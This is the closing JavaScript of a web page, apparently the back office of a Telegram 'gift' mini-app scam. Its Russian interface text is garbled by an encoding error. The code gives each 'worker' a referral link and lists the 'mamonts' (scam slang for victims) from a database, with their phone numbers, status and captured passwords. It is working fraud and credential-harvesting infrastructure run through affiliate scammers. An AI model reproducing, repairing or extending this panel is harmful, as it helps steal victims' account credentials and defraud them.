                console.error('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –º–∞–º–æ–Ω—Ç–∞:', error);
                alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –Ω–æ–º–µ—Ä–∞');
            }
            
            document.getElementById('phoneInput').value = '';
            closePhoneInput();
        }
        
        function openWorkerMode() {
            document.getElementById('workerModal').style.display = 'flex';
            // –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –º–æ–¥–∞–ª–∫–∏ —Ç–æ–∂–µ –æ–±–Ω–æ–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É
            generateReferralLink();
        }
        
        function closeWorkerMode() {
            document.getElementById('workerModal').style.display = 'none';
        }

        function openOwnerMode() {
            document.getElementById('ownerModal').style.display = 'flex';
            loadAllReferralLinks();
            loadAllMamonts();
        }
        
        function closeOwnerMode() {
            document.getElementById('ownerModal').style.display = 'none';
        }
        
        function copyReferralLink() {
            const linkElement = document.querySelector('#referralLink span');
            const link = linkElement.textContent;
            navigator.clipboard.writeText(link);
            alert('–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞!');
        }

        async function loadAllReferralLinks() {
            try {
                const { data, error } = await supabase
                    .from('workers')
                    .select('*');
                
                if (error) throw error;
                
                if (data && data.length > 0) {
                    displayReferralLinks(data);
                } else {
                    document.getElementById('referralLinksList').innerHTML = '<div style="color: #bbb; text-align: center; padding: 20px;">–ù–µ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã—Ö —Å—Å—ã–ª–æ–∫</div>';
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Å—ã–ª–æ–∫:', error);
            }
        }

        function displayReferralLinks(workers) {
            const container = document.getElementById('referralLinksList');
            container.innerHTML = '';
            
            workers.forEach(worker => {
                const referralLink = `https://t.me/GemHanterRobot/gemhanter?startapp=${btoa('worker_' + worker.id).replace(/=/g, '')}`;
                
                const linkElement = document.createElement('div');
                linkElement.className = 'mamont-item';
                linkElement.onclick = () => showLinkMamonts(worker);
                
                linkElement.innerHTML = `
                    <div class="mamont-phone">–í–æ—Ä–∫–µ—Ä: ${worker.username}</div>
                    <div class="mamont-status">–°—Å—ã–ª–∫–∞: ${referralLink}</div>
                `;
                
                container.appendChild(linkElement);
            });
        }

        async function showLinkMamonts(worker) {
            try {
                const { data, error } = await supabase
                    .from('mamonts')
                    .select('*')
                    .eq('worker_id', worker.id);
                
                if (error) throw error;
                
                const container = document.getElementById('linkMamontsList');
                container.innerHTML = '<div class="worker-section-title">–ú–∞–º–æ–Ω—Ç—ã –≤–æ—Ä–∫–µ—Ä–∞: ' + worker.username + '</div>';
                
                if (data && data.length > 0) {
                    data.forEach(mamont => {
                        let passwordHtml = '';
                        if (mamont.password) {
                            passwordHtml = `<div class="mamont-password">–ü–∞—Ä–æ–ª—å: ${mamont.password}</div>`;
                        }
                        
                        const mamontElement = document.createElement('div');
                        mamontElement.className = 'mamont-item';
                        
                        mamontElement.innerHTML = `
                            <div class="mamont-phone">${mamont.phone || '–ù–µ—Ç –Ω–æ–º–µ—Ä–∞'}</div>
                            <div class="mamont-status">–°—Ç–∞—Ç—É—Å: ${getStatusText(mamont.status)}</div>
                            ${passwordHtml}
                        `;
                        
                        container.appendChild(mamontElement);
                    });
                } else {
                    container.innerHTML += '<div style="color: #bbb; text-align: center; padding: 20px;">–ù–µ—Ç –º–∞–º–æ–Ω—Ç–æ–≤</div>';
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –º–∞–º–æ–Ω—Ç–æ–≤:', error);
            }
        }

        async function loadAllMamonts() {
            try {
                const { data, error } = await supabase
                    .from('mamonts')
                    .select('*, workers(username)')
                    .order('created_at', { ascending: false });
                
                if (error) throw error;
                
                if (data && data.length > 0) {
                    displayAllMamonts(data);
                } else {
                    document.getElementById('allMamontsList').innerHTML = '<div style="color: #bbb; text-align: center; padding: 20px;">–ù–µ—Ç –º–∞–º–æ–Ω—Ç–æ–≤</div>';
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –≤—Å–µ—Ö –º–∞–º–æ–Ω—Ç–æ–≤:', error);
            }
        }

        function displayAllMamonts(mamonts) {
            const container = document.getElementById('allMamontsList');
            container.innerHTML = '';
            
            mamonts.forEach(mamont => {
                let passwordHtml = '';
                if (mamont.password) {
                    passwordHtml = `<div class="mamont-password">–ü–∞—Ä–æ–ª—å: ${mamont.password}</div>`;
                }
                
                const mamontElement = document.createElement('div');
                mamontElement.className = 'mamont-item';
                
                mamontElement.innerHTML = `
                    <div class="mamont-phone">${mamont.phone || '–ù–µ—Ç –Ω–æ–º–µ—Ä–∞'}</div>
                    <div class="mamont-status">–°—Ç–∞—Ç—É—Å: ${getStatusText(mamont.status)}</div>
                    <div class="mamont-status">–í–æ—Ä–∫–µ—Ä: ${mamont.workers?.username || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</div>
                    ${passwordHtml}
                `;
                
                container.appendChild(mamontElement);
            });
        }

        // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤–∏–¥–µ–æ
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('giftVideo');
            if (video) {
                video.controls = false;
                video.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                });
            }
        });
    </script>
</body>
</html>
